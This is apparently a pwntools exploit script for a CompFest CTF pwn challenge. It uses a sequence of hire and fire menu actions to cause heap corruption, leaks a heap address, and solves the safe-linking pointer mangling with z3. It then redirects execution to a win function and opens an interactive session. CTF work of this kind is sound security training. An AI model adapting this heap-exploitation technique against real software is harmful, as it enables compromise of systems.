from pwn import *

HOST='ctf.compfest.id'
PORT=7003

binpath = b'./chall'
libcpath = b'./libc.so.6'

context.binary = ELF(binpath)
context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']

e = ELF(binpath)
libc = ELF(libcpath)

gdbscript="""
b *0x4028B8
c
"""

# b *0x402947
# b *0x402991
# b *0x4029BB

io = 0
if args.REMOTE:
  io = remote(HOST, PORT)
elif args.GDB:
  io = process()
  gdb.attach(io, gdbscript=gdbscript)
else:
  io = process()

#### Start exploiting ####

choice_map = 0x408440

def hire(index):
  io.sendlineafter(b'>> ', b'1')
  io.sendlineafter(b'>> ', str(index).encode())

def fire(index):
  io.sendlineafter(b'>> ', b'2')
  io.sendlineafter(b'>> ', str(index).encode())

def view_history():
  io.sendlineafter(b'>> ', b'4')

def clear_history():
  io.sendlineafter(b'>> ', b'5')

import z3

def solve_heap(val):
    # solve heap when have some mangled values ((pos >> 12) ^ ptr)
    heap = z3.BitVec('heap', 32) # 32 because seen in gdb
    expr = ((heap + 0x123e0) >> 12) ^ (heap + 0x12450)
    s = z3.Solver()
    s.add(expr == val)

    first = None
    i = 0
    while s.check() == z3.sat:
        m = s.model()
        h = m[heap].as_long()
        print(f"[{i}] heap candidate = 0x{h:016x}")
        if first is None or first > h:
            first = h
        s.add(heap != h)  # block this solution
        i += 1

    return first

for i in range(0,8): hire(i)
for i in range(7,-1,-1): fire(i)
hire(8)
view_history()


io.recvuntil(b'So far')
for i in range(25): io.recvline()
io.recvuntil(b' (')
val = int(io.recvuntil(b')', drop=True), 10)

heap = solve_heap(val)

print(f'heap: {hex(heap)}')

# now, choice_map = heap + 0x122b0
choice_map = heap + 0x122b0
win = 0x402619

for i in range(0x100): hire(0)
hire(8)
clear_history()
hire(0)

io.sendlineafter(b'>> ', str(win).encode())
io.sendlineafter(b'>> ', b'0')
for i in range(5): io.sendlineafter(b'>> ', str(0xdead).encode())
io.sendlineafter(b'>> ', str(heap + 0x150b4).encode())
io.sendlineafter(b'>> ', b'0')

io.sendlineafter(b'>> ', b'3')
io.sendlineafter(b'>> ', b'0')

io.interactive()